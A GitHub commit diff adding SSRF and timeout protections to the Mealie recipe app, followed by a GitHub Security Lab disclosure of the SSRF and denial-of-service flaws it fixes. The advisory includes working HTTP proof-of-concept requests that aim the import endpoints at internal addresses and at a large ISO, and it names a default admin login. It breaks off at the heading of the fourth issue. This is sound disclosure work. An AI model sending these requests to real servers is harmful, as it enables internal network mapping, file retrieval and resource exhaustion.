|  |  | | OIDC\_AUTO\_REDIRECT  | False  | If `True`, then the login page will be bypassed an you will be sent directly to your Identity Provider. You can still get to the login page by adding `?direct=1` to the login URL  | |
|  |  | | OIDC\_PROVIDER\_NAME  | OAuth  | The provider name is shown in SSO login button. "Login with <OIDC\_PROVIDER\_NAME\>"  | |
|  |  | | OIDC\_REMEMBER\_ME  | False  | Because redirects bypass the login screen, you cant extend your session by clicking the "Remember Me" checkbox. By setting this value to true, a session will be extended as if "Remember Me" was checked | |
|  |  | | OIDC\_SIGNING\_ALGORITHM |  RS256  | The algorithm used to sign the id token (examples: RS256, HS256)  | |
|  |  |  |
|  |  | ### Themeing |
|  |  |  |
| Expand All | | @@ -113,7 +117,6 @@ Setting the following environmental variables will change the theme of the front |
|  |  | | THEME\_DARK\_WARNING | #FF6D00 | Dark Theme Config Variable | |
|  |  | | THEME\_DARK\_ERROR | #EF5350 | Dark Theme Config Variable | |
|  |  |  |
|  |  |  |
|  |  | [workers\_per\_core]: https://github.com/tiangolo/uvicorn-gunicorn-docker/blob/2daa3e3873c837d5781feb4ff6a40a89f791f81b/README.md#workers\_per\_core |
|  |  | [max\_workers]: https://github.com/tiangolo/uvicorn-gunicorn-docker/blob/2daa3e3873c837d5781feb4ff6a40a89f791f81b/README.md#max\_workers |
|  |  | [web\_concurrency]: https://github.com/tiangolo/uvicorn-gunicorn-docker/blob/2daa3e3873c837d5781feb4ff6a40a89f791f81b/README.md#web\_concurrency |

43 changes: 43 additions & 0 deletions

43
[docs/docs/documentation/getting-started/installation/security.md](#diff-f886eb5da05853204da4967a1098fbb91ce0452a20bc26780d481529637630f9 "docs/docs/documentation/getting-started/installation/security.md")

Show comments

[View file](/mealie-recipes/mealie/blob/2a3463b7466bc297aede50046da9550d919ec56f/docs/docs/documentation/getting-started/installation/security.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -0,0 +1,43 @@ |
|  |  | --- |
|  |  | tags: |
|  |  | - Security |
|  |  | --- |
|  |  |  |
|  |  | # Security Considerations |
|  |  |  |
|  |  | This page is a collection of security considerations for Mealie. It mostly deals with reported issues and how it's possible to mitigate them. Note that this page is for you to use as a guide for how secure you want to make your deployment. It's important to note that most of these will not apply to you, if you: |
|  |  |  |
|  |  | 1. Run behind a VPN |
|  |  | 2. Use a strong password |
|  |  | 3. Disable Sign-Ups |
|  |  | 4. Don't host for malicious users |
|  |  |  |
|  |  | Use your best judgement when deciding what to do. |
|  |  |  |
|  |  | ## Denial of Service |
|  |  |  |
|  |  | By default, the API is \*\*not\*\* rate limited. This leaves Mealie open to a potential \*\*Denial of Service Attack\*\*. While it's possible to perform a \*\*Denial of Service Attack\*\* on any endpoint, there are a few key endpoints that are more vulnerable than others. |
|  |  |  |
|  |  | - `/api/recipes/create-url` |
|  |  | - `/api/recipes/{id}/image` |
|  |  |  |
|  |  | These endpoints are used to scrape data based off a user provided URL. It is possible for a malicious user to issue multiple requests to download an arbitrarily large external file (e.g a Debian ISO) and sufficiently saturate a CPU assigned to the container. While we do implement some protections against this by chunking the response, and using a timeout strategy, it's still possible to overload the CPU if an attacker issues multiple requests concurrently. |
|  |  |  |
|  |  | ### Mitigation |
|  |  |  |
|  |  | If you'd like to mitigate this risk, we suggest that you rate limit the API in general, and apply strict rate limits to these endpoints. You can do this by utilizing a reverse proxy. See the following links to get started: |
|  |  |  |
|  |  | - [Traefik](https://doc.traefik.io/traefik/middlewares/http/ratelimit/) |
|  |  | - [Nginx](https://nginx.org/en/docs/http/ngx\_http\_limit\_req\_module.html) |
|  |  | - [Caddy](https://caddyserver.com/docs/modules/http.handlers.rate\_limit) |
|  |  |  |
|  |  | ## Server Side Request Forgery |
|  |  |  |
|  |  | - `/api/recipes/create-url` |
|  |  | - `/api/recipes/{id}/image` |
|  |  |  |
|  |  | Given the nature of these APIs it's possible to perform a \*\*Server Side Request Forgery\*\* attack. This is where a malicious user can issue a request to an internal network resource, and potentially exfiltrate data. We \_do\_ perform some checks to mitigate access to resources within your network but at the end of the day, users of Mealie are allowed to trigger HTTP requests on \*\*your server\*\*. |
|  |  |  |
|  |  | ### Mitigation |
|  |  |  |
|  |  | If you'd like to mitigate this risk, we suggest that you isolate the container that Mealie is running in to ensure that it's access to internal resources is limited only to what is required. \_Note that Mealie does require access to the internet for recipe imports.\_ You might consider isolating Mealie from your home network entirely and only allowing access to the external internet. |

1 change: 1 addition & 0 deletions

1
[docs/mkdocs.yml](#diff-7618337a88ea47f9b778a21f0e17d43eab2aba4880c6be2d95a7bf95e4b8b2df "docs/mkdocs.yml")

Show comments

[View file](/mealie-recipes/mealie/blob/2a3463b7466bc297aede50046da9550d919ec56f/docs/mkdocs.yml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -72,6 +72,7 @@ nav: |
|  |  | - SQLite (Recommended): "documentation/getting-started/installation/sqlite.md" |
|  |  | - PostgreSQL: "documentation/getting-started/installation/postgres.md" |
|  |  | - Backend Configuration: "documentation/getting-started/installation/backend-config.md" |
|  |  | - Security: "documentation/getting-started/installation/security.md" |
|  |  | - Usage: |
|  |  | - Backup and Restoring: "documentation/getting-started/usage/backups-and-restoring.md" |
|  |  | - Permissions and Public Access: "documentation/getting-started/usage/permissions-and-public-access.md" |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[mealie/core/settings/settings.py](#diff-b2c7c4d6222f2e15f9f89e851b4a98b2562e58919ace9bd207cb4a4109f05c40 "mealie/core/settings/settings.py")

Show comments

[View file](/mealie-recipes/mealie/blob/2a3463b7466bc297aede50046da9550d919ec56f/mealie/core/settings/settings.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -47,7 +47,7 @@ class AppSettings(BaseSettings): |
|  |  |  |
|  |  | GIT\_COMMIT\_HASH: str = "unknown" |
|  |  |  |
|  |  | ALLOW\_SIGNUP: bool = True |
|  |  | ALLOW\_SIGNUP: bool = False |
|  |  |  |
|  |  | # =============================================== |
|  |  | # Security Configuration |
| Expand Down | |  |

7 changes: 7 additions & 0 deletions

7
[mealie/pkgs/safehttp/\_\_init\_\_.py](#diff-0582c796706b4aae479c713aec8df9fa879e421126f5483e9d21d8309e5a5174 "mealie/pkgs/safehttp/__init__.py")

Show comments

[View file](/mealie-recipes/mealie/blob/2a3463b7466bc297aede50046da9550d919ec56f/mealie/pkgs/safehttp/__init__.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,7 @@ |
|  |  | from .transport import AsyncSafeTransport, ForcedTimeoutException, InvalidDomainError |
|  |  |  |
|  |  | \_\_all\_\_ = [ |
|  |  | "AsyncSafeTransport", |
|  |  | "ForcedTimeoutException", |
|  |  | "InvalidDomainError", |
|  |  | ] |

78 changes: 78 additions & 0 deletions

78
[mealie/pkgs/safehttp/transport.py](#diff-7cabaaea41f93e5009444bbd80f48921596f95ead3e41ee45f1fe154d41be858 "mealie/pkgs/safehttp/transport.py")

Show comments

[View file](/mealie-recipes/mealie/blob/2a3463b7466bc297aede50046da9550d919ec56f/mealie/pkgs/safehttp/transport.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,78 @@ |
|  |  | import ipaddress |
|  |  | import logging |
|  |  | import socket |
|  |  |  |
|  |  | import httpx |
|  |  |  |
|  |  |  |
|  |  | class ForcedTimeoutException(Exception): |
|  |  | """ |
|  |  | Raised when a request takes longer than the timeout value. |
|  |  | """ |
|  |  |  |
|  |  | ... |
|  |  |  |
|  |  |  |
|  |  | class InvalidDomainError(Exception): |
|  |  | """ |
|  |  | Raised when a request is made to a local IP address. |
|  |  | """ |
|  |  |  |
|  |  | ... |
|  |  |  |
|  |  |  |
|  |  | class AsyncSafeTransport(httpx.AsyncBaseTransport): |
|  |  | """ |
|  |  | A wrapper around the httpx transport class that enforces a timeout value |
|  |  | and that the request is not made to a local IP address. |
|  |  | """ |
|  |  |  |
|  |  | timeout: int = 15 |
|  |  |  |
|  |  | def \_\_init\_\_(self, log: logging.Logger | None = None, \*\*kwargs): |
|  |  | self.timeout = kwargs.pop("timeout", self.timeout) |
|  |  | self.\_wrapper = httpx.AsyncHTTPTransport(\*\*kwargs) |
|  |  | self.\_log = log |
|  |  |  |
|  |  | async def handle\_async\_request(self, request): |
|  |  | # override timeout value for \_all\_ requests |
|  |  | request.extensions["timeout"] = httpx.Timeout(self.timeout, pool=self.timeout).as\_dict() |
|  |  |  |
|  |  | # validate the request is not attempting to connect to a local IP |
|  |  | # This is a security measure to prevent SSRF attacks |
|  |  |  |
|  |  | ip: ipaddress.IPv4Address | ipaddress.IPv6Address | None = None |
|  |  |  |
|  |  | netloc = request.url.netloc.decode() |
|  |  | if ":" in netloc: # Either an IP, or a hostname:port combo |
|  |  | netloc\_parts = netloc.split(":") |
|  |  |  |
|  |  | netloc = netloc\_parts[0] |
|  |  |  |
|  |  | try: |
|  |  | ip = ipaddress.ip\_address(netloc) |
|  |  | except ValueError: |
|  |  | if self.\_log: |
|  |  | self.\_log.debug(f"failed to parse ip for {netloc=} falling back to domain resolution") |
|  |  | pass |
|  |  |  |
|  |  | # Request is a domain or a hostname. |
|  |  | if not ip: |
|  |  | if self.\_log: |
|  |  | self.\_log.debug(f"resolving IP for domain: {netloc}") |
|  |  |  |
|  |  | ip\_str = socket.gethostbyname(netloc) |
|  |  | ip = ipaddress.ip\_address(ip\_str) |
|  |  |  |
|  |  | if self.\_log: |
|  |  | self.\_log.debug(f"resolved IP for domain: {netloc} -> {ip}") |
|  |  |  |
|  |  | if ip.is\_private: |
|  |  | if self.\_log: |
|  |  | self.\_log.warning(f"invalid request on local resource: {request.url} -> {ip}") |
|  |  | raise InvalidDomainError(f"invalid request on local resource: {request.url} -> {ip}") |
|  |  |  |
|  |  | return await self.\_wrapper.handle\_async\_request(request) |
|  |  |  |
|  |  | async def aclose(self): |
|  |  | await self.\_wrapper.aclose() |

44 changes: 17 additions & 27 deletions

44
[mealie/services/recipe/recipe\_data\_service.py](#diff-4bbc3b382063eafb2e5aaafee2fe4b72b996da6a28ac9ba5e99a7cc45de87788 "mealie/services/recipe/recipe_data_service.py")

Show comments

[View file](/mealie-recipes/mealie/blob/2a3463b7466bc297aede50046da9550d919ec56f/mealie/services/recipe/recipe_data_service.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -5,7 +5,8 @@ |
|  |  | from httpx import AsyncClient, Response |
|  |  | from pydantic import UUID4 |
|  |  |  |
|  |  | from mealie.pkgs import img |
|  |  | from mealie.pkgs import img, safehttp |
|  |  | from mealie.pkgs.safehttp.transport import AsyncSafeTransport |
|  |  | from mealie.schema.recipe.recipe import Recipe |
|  |  | from mealie.services.\_base\_service import BaseService |
|  |  |  |
| Expand All | | @@ -29,12 +30,14 @@ async def largest\_content\_len(urls: list[str]) -> tuple[str, int]: |
|  |  | largest\_url = "" |
|  |  | largest\_len = 0 |
|  |  |  |
|  |  | max\_concurrency = 10 |
|  |  |  |
|  |  | async def do(client: AsyncClient, url: str) -> Response: |
|  |  | return await client.head(url, headers={"User-Agent": \_FIREFOX\_UA}) |
|  |  |  |
|  |  | async with AsyncClient() as client: |
|  |  | async with AsyncClient(transport=safehttp.AsyncSafeTransport()) as client: |
|  |  | tasks = [do(client, url) for url in urls] |
|  |  | responses: list[Response] = await gather\_with\_concurrency(10, \*tasks, ignore\_exceptions=True) |
|  |  | responses: list[Response] = await gather\_with\_concurrency(max\_concurrency, \*tasks, ignore\_exceptions=True) |
|  |  | for response in responses: |
|  |  | len\_int = int(response.headers.get("Content-Length", 0)) |
|  |  | if len\_int > largest\_len: |
| Expand Down  Expand Up | | @@ -101,52 +104,39 @@ def write\_image(self, file\_data: bytes | Path, extension: str, image\_dir: Path | |
|  |  |  |
|  |  | return image\_path |
|  |  |  |
|  |  | @staticmethod |
|  |  | def \_validate\_image\_url(url: str) -> bool: |
|  |  | # sourcery skip: invert-any-all, use-any |
|  |  | """ |
|  |  | Validates that the URL is of an allowed source and restricts certain sources to prevent |
|  |  | malicious images from being downloaded. |
|  |  | """ |
|  |  | invalid\_domains = {"127.0.0.1", "localhost"} |
|  |  | for domain in invalid\_domains: |
|  |  | if domain in url: |
|  |  | return False |
|  |  |  |
|  |  | return True |
|  |  |  |
|  |  | async def scrape\_image(self, image\_url) -> None: |
|  |  | async def scrape\_image(self, image\_url: str | dict[str, str] | list[str]) -> None: |
|  |  | self.logger.info(f"Image URL: {image\_url}") |
|  |  |  |
|  |  | if not self.\_validate\_image\_url(image\_url): |
|  |  | self.logger.error(f"Invalid image URL: {image\_url}") |
|  |  | raise InvalidDomainError(f"Invalid domain: {image\_url}") |
|  |  | image\_url\_str = "" |
|  |  |  |
|  |  | if isinstance(image\_url, str): # Handles String Types |
|  |  | pass |
|  |  | image\_url\_str = image\_url |
|  |  |  |
|  |  | elif isinstance(image\_url, list): # Handles List Types |
|  |  | # Multiple images have been defined in the schema - usually different resolutions |
|  |  | # Typically would be in smallest->biggest order, but can't be certain so test each. |
|  |  | # 'Google will pick the best image to display in Search results based on the aspect ratio and resolution.' |
|  |  | image\_url, \_ = await largest\_content\_len(image\_url) |
|  |  | image\_url\_str, \_ = await largest\_content\_len(image\_url) |
|  |  |  |
|  |  | elif isinstance(image\_url, dict): # Handles Dictionary Types |
|  |  | for key in image\_url: |
|  |  | if key == "url": |
|  |  | image\_url = image\_url.get("url") |
|  |  | image\_url\_str = image\_url.get("url", "") |
|  |  |  |
|  |  | if not image\_url\_str: |
|  |  | raise ValueError(f"image url could not be parsed from input: {image\_url}") |
|  |  |  |
|  |  | ext = image\_url.split(".")[-1] |
|  |  | ext = image\_url\_str.split(".")[-1] |
|  |  |  |
|  |  | if ext not in img.IMAGE\_EXTENSIONS: |
|  |  | ext = "jpg" # Guess the extension |
|  |  |  |
|  |  | file\_name = f"{str(self.recipe\_id)}.{ext}" |
|  |  | file\_path = Recipe.directory\_from\_id(self.recipe\_id).joinpath("images", file\_name) |
|  |  |  |
|  |  | async with AsyncClient() as client: |
|  |  | async with AsyncClient(transport=AsyncSafeTransport()) as client: |
|  |  | try: |
|  |  | r = await client.get(image\_url, headers={"User-Agent": \_FIREFOX\_UA}) |
|  |  | r = await client.get(image\_url\_str, headers={"User-Agent": \_FIREFOX\_UA}) |
|  |  | except Exception: |
|  |  | self.logger.exception("Fatal Image Request Exception") |
|  |  | return None |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[mealie/services/scraper/scraper.py](#diff-e2738538e9122d7d8abbb0524597bc8ecc313dcfb07a69c6b15f6cc11a3b0116 "mealie/services/scraper/scraper.py")

Show comments

[View file](/mealie-recipes/mealie/blob/2a3463b7466bc297aede50046da9550d919ec56f/mealie/services/scraper/scraper.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -43,7 +43,7 @@ async def create\_from\_url(url: str, translator: Translator) -> tuple[Recipe, Scr |
|  |  | recipe\_data\_service = RecipeDataService(new\_recipe.id) |
|  |  |  |
|  |  | try: |
|  |  | await recipe\_data\_service.scrape\_image(new\_recipe.image) |
|  |  | await recipe\_data\_service.scrape\_image(new\_recipe.image) # type: ignore |
|  |  |  |
|  |  | if new\_recipe.name is None: |
|  |  | new\_recipe.name = "Untitled" |
| Expand Down | |  |

3 changes: 2 additions & 1 deletion

3
[mealie/services/scraper/scraper\_strategies.py](#diff-edec6f991f22145fdd68e3683d71044c880158f3d6b1dea61d50cb51f9fdb194 "mealie/services/scraper/scraper_strategies.py")

Show comments

[View file](/mealie-recipes/mealie/blob/2a3463b7466bc297aede50046da9550d919ec56f/mealie/services/scraper/scraper_strategies.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -12,6 +12,7 @@ |
|  |  |  |
|  |  | from mealie.core.root\_logger import get\_logger |
|  |  | from mealie.lang.providers import Translator |
|  |  | from mealie.pkgs import safehttp |
|  |  | from mealie.schema.recipe.recipe import Recipe, RecipeStep |
|  |  | from mealie.services.scraper.scraped\_extras import ScrapedExtras |
|  |  |  |
| Expand All | | @@ -31,7 +32,7 @@ async def safe\_scrape\_html(url: str) -> str: |
|  |  | if the request takes longer than 15 seconds. This is used to mitigate |
|  |  | DDOS attacks from users providing a url with arbitrary large content. |
|  |  | """ |
|  |  | async with AsyncClient() as client: |
|  |  | async with AsyncClient(transport=safehttp.AsyncSafeTransport()) as client: |
|  |  | html\_bytes = b"" |
|  |  | async with client.stream("GET", url, timeout=SCRAPER\_TIMEOUT, headers={"User-Agent": \_FIREFOX\_UA}) as resp: |
|  |  | start\_time = time.time() |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `2a3463b`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmealie-recipes%2Fmealie%2Fcommit%2F2a3463b7466bc297aede50046da9550d919ec56f) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from securitylab.github.com_4a6127e6_20250111_170104.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

April 12, 2024
# GHSL-2023-225, GHSL-2023-226, GHSL-2023-227, and GHSL-2023-228: Server-Side Request Forgery (SSRF) and Denial of Service (DoS) in Mealie - CVE-2024-31991, CVE-2024-31992, CVE-2024-31993, CVE-2024-31994

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
Logan MacLaren](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2023-12-15- Findings are privately disclosed to Mealie maintainers [as per their instructions](https://github.com/mealie-recipes/mealie?tab=security-ov-file#reporting-a-vulnerability) with a noted disclosure date of March 14th, 2024.
* 2024-01-30 - An update is requested from the Mealie team.
* 2024-03-14 - An [issue](https://github.com/mealie-recipes/mealie/issues/3315) is opened in the [Mealie repository](https://github.com/mealie-recipes/mealie) requesting an update to avoid disclosure of actively exploitable vulnerabilities.
* 2024-03-15 - Mealie maintainers respond and request extension of disclosure timeline to March 25th.
* 2024-03-25 - An update is requested from the Mealie team.
* 2024-04-03 - Pull Request [3368](https://github.com/mealie-recipes/mealie/pull/3368) is merged, and version 1.4.0 is released containing fixes.
* 2024-04-09 - CVEs are assigned.

## Summary

Mealie v1.0.0-RC1.1 is vulnerable to multiple SSRF and DoS vulnerabilities. These vulnerabilities can be leveraged to identify, map, and retrieve the contents of webservers on Mealie’s local network as well as being the victim of, or launching point for, a denial of service attack against a target of the attacker’s choice.

## Project

Mealie

## Tested Version

[v1.0.0-RC1.1](https://github.com/mealie-recipes/mealie/releases/tag/v1.0.0-RC1.1)

## Details

### Issue 1: GET-based SSRF in recipe importer (`GHSL-2023-225`)

The [`safe_scrape_html` function](https://github.com/mealie-recipes/mealie/blob/mealie-next/mealie/services/scraper/scraper_strategies.py#L27-L70) utilizes a user-controlled URL to issue a request to a remote server. Based on the content of the response, it will either parse the content or disregard it. This function, nor those that call it, add any restrictions on the URL that can be provided, nor is it restricted to being an FQDN (i.e., an IP address can be provided).

As this function’s return will be handled differently by its caller depending on the response, it is possible for an attacker to use this functionality to positively identify HTTP(s) servers on the local network with any IP/port combination. A successful (i.e., any) response from the target URL, but one that does not provide a valid recipe, will throw a [user-facing 400 error](https://github.com/mealie-recipes/mealie/blob/25898496828a04d5a384ffd33b2cb79560978a76/mealie/services/scraper/scraper.py#L35-L36):

```
 if not new_recipe:
        raise HTTPException(status.HTTP_400_BAD_REQUEST, {"details": ParserErrors.BAD_RECIPE_DATA.value})

```

An unsuccessful response (i.e., no response from the target/timeout) will result in a 500 error being returned due to an underlying exception being thrown.

While these are not exposed in the UI, it is possible to `POST` directly to the [create-url API endpoint](https://github.com/mealie-recipes/mealie/blob/mealie-next/mealie/routes/recipe/recipe_crud_routes.py#L166) to elicit the response.

Requesting a non-existent resource:

```
POST /api/recipes/create-url HTTP/1.1
Host: <mealie_host>:9925
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/plain, */*
Accept-Language: en-US
Accept-Encoding: gzip, deflate, br
Authorization: Bearer <token>
Content-Type: application/json
Content-Length: 47
Origin: http://<mealie_host>:9925
DNT: 1
Connection: close
Cookie: i18n_redirected=en-US; mealie.auth.strategy=local; mealie.auth._token.local=Bearer%20<token>; mealie.auth._token_expiration.local=1700837039000
Sec-GPC: 1

{"url":"http://foo.bar/baz","includeTags":false}

```

```
HTTP/1.1 500 Internal Server Error
date: Wed, 22 Nov 2023 14:47:01 GMT
server: uvicorn
content-length: 21
content-type: text/plain; charset=utf-8
connection: close

Internal Server Error

```

Making a request to a webserver on the same private network:

```
POST /api/recipes/create-url HTTP/1.1
Host: <mealie_host>:9925
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/plain, */*
Accept-Language: en-US
Accept-Encoding: gzip, deflate, br
Authorization: Bearer <token>
Content-Type: application/json
Content-Length: 47
Origin: http://<mealie_host>:9925
DNT: 1
Connection: close
Cookie: i18n_redirected=en-US; mealie.auth.strategy=local; mealie.auth._token.local=Bearer%20<token>; mealie.auth._token_expiration.local=1700837039000
Sec-GPC: 1

{"url":"http://10.0.0.1:9001","includeTags":false}

```

```
HTTP/1.1 400 Bad Request
date: Wed, 22 Nov 2023 14:48:43 GMT
server: uvicorn
content-length: 40
content-type: application/json
connection: close

{"detail":{"details":"BAD_RECIPE_DATA"}}

```

This was identified with CodeQL’s [Full server-side request forgery](https://codeql.github.com/codeql-query-help/python/py-full-ssrf/) query.

#### Impact

This issue can result in any authenticated user being able to map HTTP servers on a local network that the Mealie service has access to. Note that by default any user can create an account on a Mealie server, and that the default `changeme@example.com` user is available with its hard-coded password.

#### Resources

* https://cwe.mitre.org/data/definitions/918.html

### Issue 2: DoS vulnerability in recipe importer (`GHSL-2023-226`)

The [`safe_scrape_html` function](https://github.com/mealie-recipes/mealie/blob/mealie-next/mealie/services/scraper/scraper_strategies.py#L27-L70) utilizes a user-controlled URL to issue a request to a remote server, however these requests are not rate-limited.

While there are [efforts to prevent DDoS by implementing a timeout on requests](https://github.com/mealie-recipes/mealie/blob/mealie-next/mealie/services/scraper/scraper_strategies.py#L28-L32), it is possible for an attacker to issue a large number of requests to the server which will be handled in batches based on the configuration of the Mealie server.

The [chunking of responses](https://github.com/mealie-recipes/mealie/blob/mealie-next/mealie/services/scraper/scraper_strategies.py#L38) is helpful for mitigating memory exhaustion on the Mealie server, however a single request to an arbitrarily large external file (e.g. a Debian ISO) is often sufficient to completely saturate a CPU core assigned to the Mealie container. Without rate limiting in place, it is possible to not only sustain traffic against an external target indefinitely, but also to exhaust the CPU resources assigned to the Mealie container.

Send a request to download a Debian ISO:

```
POST /api/recipes/create-url HTTP/1.1
Host: <mealie_host>:9925
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/plain, */*
Accept-Language: en-US
Accept-Encoding: gzip, deflate, br
Authorization: Bearer <token>
Content-Type: application/json
Content-Length: 47
Origin: http://<mealie_host>:9925
DNT: 1
Connection: close
Cookie: i18n_redirected=en-US; mealie.auth.strategy=local; mealie.auth._token.local=Bearer%20<token>; mealie.auth._token_expiration.local=1700837039000
Sec-GPC: 1

{"url":"https://saimei.ftp.acc.umu.se/debian-cd/current/amd64/iso-cd/debian-12.2.0-amd64-netinst.iso","includeTags":false}

```

Observe impact on the container’s CPU utilization (capped at 1 worker/1 web concurrency):

```
737e59e3edb2   mealie                100.98%   189.8MiB / 1000MiB    18.98%    11.1MB / 1.4MB    262MB / 254kB     8

```

Increase workers/web concurrency to 4 and send multiple concurrent requests:

```
05be1d018e00   mealie                400.12%   613.1MiB / 1000MiB    61.31%    39MB / 265kB      241MB / 0B        28

```

These requests will eventually return a 408, however they can be sustained indefinitely and can also be queued server-side if more than 10 concurrenct requests are received by the server.

#### Impact

This issue can result in any authenticated user being able to exhaust the CPU resources available to the Mealie container as well as sustaining network traffic to a target of their choice indefinitely. Note that by default any user can create an account on a Mealie server, and that the default `changeme@example.com` user is available with its hard-coded password.

#### Resources

* https://pypi.org/project/fastapi-limiter/
* https://pypi.org/project/slowapi/

### Issue 3: GET-based SSRF in recipe image importer (`GHSL-2023-227`)

The [`scrape_image` function](https://github.com/mealie-recipes/mealie/blob/ee121a12f8db33ecb4db5f8582f7ea9788d019e4/mealie/services/recipe/recipe_data_service.py#L107) will retrieve an image based on a user-provided URL, however the provided URL is not validated to point to an external location and does not have any enforced rate limiting.

The response from the Mealie server will also vary depending on whether or not the target file is an image, is not an image, or does not exist.

Request a resource (*file or directory*) that does not exist:

```
POST /api/recipes/foo/image HTTP/1.1
Host: <mealie_host>:9925
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Authorization: Bearer <token>
Content-Type: application/json
Content-Length: 102
Connection: close
Cookie: i18n_redirected=en-US; mealie.auth.strategy=local; mealie.auth._token.local=Bearer%20<token>; mealie.auth._token_expiration.local=1700837039000

{"url":"http://10.0.0.1/foo"}

```

The response will be `null`:

```
HTTP/1.1 200 OK
date: Wed, 22 Nov 2023 15:22:53 GMT
server: uvicorn
content-length: 4
content-type: application/json
connection: close

null

```

Response for a resource (*file or directory*, e.g. `/foo` or `/foo/`) that does exist but is not an image:

```
HTTP/1.1 400 Bad Request
date: Wed, 22 Nov 2023 15:23:51 GMT
server: uvicorn
content-length: 74
content-type: application/json
connection: close

{"detail":{"message":"Url is not an image","error":true,"exception":null}}

```

Additionally, when a file is retrieved the file may remain stored on Mealie’s file system as `original.jpg` under the UUID of the recipe it was requested for. If the attacker has access to an admin account (e.g. the default `changeme@example.com`), this file can then be retrieved by generating and downloading a backup from `http(s)://<mealie_host>:<port>/admin/backups/`.

Note that if Mealie is running in a [development setting](https://nightly.mealie.io/contributors/developers-guide/starting-dev-server/) this could be leveraged by an attacker to retrieve any file that the Mealie server had downloaded in this fashion without the need for administrator access.

This was identified with CodeQL’s [Partial server-side request forgery](https://codeql.github.com/codeql-query-help/python/py-partial-ssrf/) query.

#### Impact

This permits an attacker to make arbitrary GET requests on a private network and brute-force map the contents of any HTTP server on the local network of Mealie, and (depending on the level of access) retrieve files accessible on the private network using the Mealie server as a proxy.

#### Resources

* https://cwe.mitre.org/data/definitions/918.html

### Issue 4: DoS in recipe image importer (`GHSL-2023-228`)

